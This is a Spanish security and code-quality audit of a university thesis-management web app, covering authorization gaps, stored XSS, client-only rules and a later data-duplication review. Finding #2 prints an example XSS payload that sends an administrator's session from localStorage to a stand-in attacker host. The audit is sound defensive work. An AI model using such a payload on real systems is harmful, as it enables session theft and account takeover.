# Auditoría — CTTG Medicina (USC)

Revisión de seguridad, arquitectura y calidad de código del sistema de trabajos de grado.

- **Repositorio:** cttg2
- **Alcance:** las 11 páginas HTML estáticas del front-end (login, radicación, actas, protocolo, sustentación, panel de coordinación)
- **Fuera de alcance:** el backend en Google Apps Script (no está en este repositorio, no pudo revisarse directamente)

## Arquitectura

El sitio no tiene servidor propio: son archivos HTML estáticos que llaman por `fetch` a una URL de **Google Apps Script** (`URL_APP`, repetida en las 11 páginas), la cual lee y escribe en Google Sheets/Drive. Esto significa que **toda la autorización real vive en un código que no está versionado en este repo** — es la pieza de mayor riesgo del sistema y hoy no tiene revisión de código posible.

---

## Hallazgos críticos

### 1. El backend confía en lo que dice el cliente, no en una sesión verificada
El login guarda la respuesta en `localStorage` (`cttg_user` / `cttg_admin`) sin firma ni token. Todas las acciones siguientes (`getFase1`, `updateEstado`, `aprobarActasAsesoria`, `validarTutores`, `actualizarProtocolo`, `updateFase3Asignacion`, `completarFase3`, `subirArchivo`, `getTutores`) solo envían un `email`/`emailCoord` de texto plano, nunca una credencial verificable. Como `URL_APP` es pública por diseño (el navegador debe poder llamarla), si el Apps Script no revalida identidad y rol en cada acción, cualquiera con esa URL puede leer todos los datos de estudiantes/tutores o modificar cualquier registro sin haber iniciado sesión.
**Verificación:** hacer un `POST` a `URL_APP` con `{"action":"getFase1"}` sin sesión previa; si devuelve datos, el hallazgo está confirmado.
**Acción requerida:** revisar el Apps Script y emitir un token de sesión que el servidor valide en cada acción — no se puede corregir desde este repositorio.

### 2. XSS almacenado — `coordinadora_fase3.html:279`
`JSON.stringify(r)` se inyecta directo dentro de un atributo `onclick` entre comillas dobles, escapando solo comillas simples. Un estudiante puede poner en el título de su proyecto algo como `x"><img src=x onerror=fetch('https://atacante.com/x?c='+localStorage.getItem('cttg_admin'))>`; al abrir la coordinadora "Fase 3 → Pendiente Asignación" el script se ejecuta en su sesión, sin necesidad de que haga clic en nada.
**Estado:** ⚠️ pendiente de corregir.

### 3. XSS almacenado — `protocolo_coordinadora.html:166-180`
Construye `tr.innerHTML` con `p.numero`, `p.emailEstudiante`, `p.nombreArchivo`, `p.anexoCambio`, `p.evaluador`, `p.decision` sin la función `esc()` que sí se usa en el resto del sistema. `nombreArchivo` es el nombre real del archivo (`file.name`) que el estudiante sube en `protocolo_fase2.html:163` — basta con nombrar el PDF con HTML malicioso.
**Estado:** ⚠️ pendiente de corregir.

---

## Hallazgos altos

- **Reglas de negocio solo en el navegador**: una radicación activa a la vez, Turnitin < 20%, orden de fases — todo es JS de interfaz, sin equivalente server-side visible. Se salta llamando las acciones directamente.
- **Sesiones sin expiración**: `localStorage` guarda el usuario indefinidamente hasta que alguien pulse "Salir" — riesgo en equipos compartidos.
- **Sin validación real de archivos**: tipo y tamaño (`subirArchivo`) solo se revisan en JavaScript antes de enviar el `base64`.

## Hallazgos medios

- `URL_APP` duplicada 39 veces en 10 archivos — rotarla exige editar cada uno.
- La función `esc()` está copiada en cada página en vez de compartida — exactamente el patrón que causó los hallazgos #2 y #3.
- `actas_asesoria.html` es una pantalla de demostración: no verifica sesión, muestra datos fijos ("Demo Estudiante", "CTTG-2026-0010") y el botón "Ya envié mi acta" nunca llama al backend — el estudiante recibe una confirmación falsa.
- Sin `Content-Security-Policy` en ninguna página.

## Hallazgos menores

- `console.log` de depuración en `estudiante_dashboard.html:474`.
- Parseo de fechas con `new Date(cadena)` dependiente del formato exacto que devuelva Sheets.
- Exportación CSV (`coordinadora_dashboard.html`) con escape mínimo de comillas.

## Lo que ya está bien

- Casi todas las pantallas escapan correctamente los datos dinámicos con `esc()` — la excepción en 2 pantallas es la causa de los críticos, no la norma.
- `coordinadora_validar_tutores.html` valida el parámetro `row` de la URL con `/^\d+$/` antes de usarlo — buen hábito a extender al resto del sistema.
- No se encontraron API keys, contraseñas ni tokens de terceros expuestos en el código.

---

## Corregido en esta revisión (ya en el repo)

- **`coordinadora_validar_tutores.html`** — el formulario de "Validar Tutores" **no reflejaba el vínculo laboral real del tutor**: el campo que llena el estudiante guarda `"Profesor con Vinculo laboral con la USC"` / `"Profesor SIN Vinculo laboral con la USC"`, pero la pantalla de la coordinadora solo reconocía `"Si"`/`"No"` — por eso el Tutor 1 siempre se mostraba como "No" y el Tutor 2 siempre aparecía como "Sin tutor 2" aunque existiera. Se agregó un mapeo (`mapVinculo`) que traduce correctamente los valores.
- **`coordinadora_dashboard.html`** — el filtro de estado "Tutores Avalados" comparaba contra `"Tutores avalados"` (minúscula) mientras que `validarTutores` guarda `"Tutores Avalados"` (mayúscula) — el filtro nunca encontraba resultados. Corregido para que coincidan.

## Pendiente — requiere acceso al Apps Script (prioridad máxima, sin plazo: es ahora)

1. Confirmar si cada acción revalida identidad/rol en servidor o solo confía en el cliente (hallazgo crítico #1).
2. Emitir un token de sesión con expiración real en el login; exigirlo en cada acción posterior.
3. Mover al servidor las reglas hoy solo-cliente (una radicación activa, Turnitin < 20%, orden de fases).
4. Validar tipo/tamaño real de archivo en `subirArchivo`.
5. Poner el código del Apps Script bajo control de versiones para que pueda auditarse y revisarse como el resto del sistema.

## Pendiente — corregible en este repositorio

1. ~~Corregir los dos XSS almacenados (#2 y #3).~~ Corregido (ver revisión de septiembre).
2. ~~Quitar el `console.log` de depuración.~~ Corregido.
3. `actas_asesoria.html`: ya muestra el radicado y las actas reales del estudiante; el botón "Ya envié mi acta" sigue sin registrar nada en el servidor (la acción real no está en este repositorio).
4. Centralizar `URL_APP` y `esc()` en un archivo compartido.
5. Agregar `Content-Security-Policy` básica.

---

# Revisión de septiembre 2026 — duplicados e inconsistencias de datos

Motivo: casos reales en los que la plataforma no dejaba avanzar a estudiantes
(Vanesa Cano, CTTG-2026-0010; Carolina Builes, CTTG-2026-0029/0058).

## Advertencia importante: el repositorio no es la versión en producción

Los datos de la hoja muestran acciones que **no existen en este repositorio**
(`AVALAR_PROTOCOLO_FASE2`, `REGISTRAR_DECISION_COMITE`, solicitudes de modificación
de radicación, confirmación de actas "post-envío del formulario web", etc.).
Los últimos cambios de `main` son de abril. La versión que usan hoy estudiantes y
coordinación está en otro lugar (probablemente dentro del propio Apps Script).
Los arreglos de este repositorio solo llegan a producción si se publican donde
realmente se sirve la plataforma. **Hay que traer ese código aquí** para poder
revisarlo y corregirlo de verdad.

## Causas encontradas en los datos

| Problema | Ejemplo real | Efecto |
|---|---|---|
| Filas de prueba con el número de radicado de un estudiante real | Fase2 fila 2: `pruebaradicacion@` con CTTG-2026-0010 "Aprobado" | La plataforma cree que el protocolo ya se aprobó; no aparece para avalar y aprobarlo no cambia nada |
| Solicitudes de Fase 2 guardadas sin número de radicado ("—") | 13 filas en "Acta asesoria" (Carolina, Vanesa, Ana Viveros, Anna Villota…) | Al aprobarlas, el sistema no sabe qué radicación desbloquear |
| Mismo grupo con dos radicaciones activas | CTTG-2026-0029 y CTTG-2026-0058 | Solicitudes y actas quedan repartidas o sin radicado |
| Solicitudes de modificación que guardan el **número de fila** | Anna Villota: RowFase1=50, pero su radicado está en la fila 49 | Aprobarla modificaría la radicación de **otro grupo** (fila 50 = CTTG-2026-0057) |
| Protocolos enviados varias veces | Vanesa: 3 filas "Cargado" iguales | Varias filas pendientes por el mismo trámite |
| La página de actas mostraba siempre "CTTG-2026-0010" (demo) y lo copiaba al portapapeles | `actas_asesoria.html` | Estudiantes podían registrar actas con el número de otro grupo |
| El selector "Cambiar estado" no tenía "Tutores Avalados", "Fase 2 Desbloqueada" ni "Cancelado", y guardaba "Pendiente Comité" en vez de "Pendiente Comité Técnico" | `coordinadora_dashboard.html` | Al guardar solo una nota el estado quedaba vacío; el estudiante perdía acceso a actas |

## Qué se agregó para identificar y manejar estos casos

### 1. Revisión automática de la hoja: `apps_script/AuditoriaDatos.gs`

Revisa la hoja de cálculo directamente (funciona con cualquier versión de la
plataforma) y escribe la hoja **"Alertas de datos"** con prioridad, qué pasa y
**qué hacer**. No modifica datos. Detecta:

- Número de radicado repetido en Fase1.
- Mismo grupo con más de una radicación activa, y estudiantes en varias radicaciones activas.
- Estados con espacios de más o no reconocidos.
- Registros de prueba (`prueba`, `test@`, `estudiante@`) mezclados con datos reales.
- Protocolos de alguien ajeno al radicado (p. ej. pruebas sobre un número real), con radicado inexistente, o enviados varias veces.
- Protocolo aprobado en Fase2 sin actualizar Fase1.
- Actas y solicitudes de Fase 2 sin número de radicado (sugiere el número correcto) o con número de otro grupo.
- Solicitudes de Fase 2 aprobadas cuya radicación sigue sin desbloquear.
- Solicitudes de modificación cuyo número de fila ya no corresponde al radicado.
- Usuarios repetidos.

Las columnas **Gestión** (Pendiente / En proceso / Resuelto / Ignorar) y **Notas de
gestión** se conservan entre ejecuciones. Instrucciones de instalación al inicio
del archivo.

Resultado sobre la hoja del 28-sep-2026: 34 alertas, 7 de prioridad ALTA.

### 2. Panel de coordinación (`coordinadora_dashboard.html`)
- Aviso **"⚠️ Duplicada con CTTG-…"** en la tabla y el detalle, métrica y filtro "Posibles duplicadas".
- Estado **Cancelado** (con motivo obligatorio), más los estados que faltaban en el selector; ya no puede guardar un estado vacío.
- Estados normalizados (espacios, mayúsculas, "Pendiente Comité" → "Pendiente Comité Técnico").
- En Actas: aviso cuando un acta o solicitud de Fase 2 **no tiene radicado** (sugiere cuál es) o tiene el de otro grupo; también dentro del modal "Solicitud de Fase 2".
- Los botones ya no incrustan textos del estudiante en el `onclick` (un apóstrofo en el nombre del archivo rompía el botón).

### 3. Protocolos (`protocolo_coordinadora.html`)
- Avisos de **envío repetido** (indica cuál es la fila más reciente) y de **otro protocolo "Aprobado" con el mismo número enviado por otra persona**.
- Corregido el XSS: todos los datos se escapan.

### 4. Estudiante (`estudiante_dashboard.html`, `actas_asesoria.html`)
- Las fases se calculan con la radicación **vigente** (ignora canceladas) y no con la primera de la lista.
- Las actas y el protocolo aprobado de **cualquier integrante del grupo** cuentan para todos; los de alguien ajeno con el mismo número (filas de prueba) no.
- "Cancelado" ya no bloquea radicar de nuevo.
- La página de actas muestra el radicado y las actas reales del estudiante.

### 5. Fase 3 (`coordinadora_fase3.html`)
- Corregido el XSS del botón "Asignar".

## Pendiente — en el Apps Script (no está en este repositorio)
1. `getFase2`/aval de protocolo: buscar por número de radicado **y** correo de un integrante, y tomar el envío más reciente; ignorar filas de otros correos.
2. Al crear la solicitud de Fase 2 guardar siempre el número de radicado; si el estudiante tiene varias activas, pedirle que elija.
3. Solicitudes de modificación: guardar y buscar por número de radicado, no por número de fila.
4. `updateEstado`: aceptar "Cancelado" y no aceptar estados vacíos.
5. `createRadicacion`: rechazar en el servidor si alguno de los estudiantes ya tiene una radicación activa.
6. Contraseñas en texto plano en la hoja Usuarios.
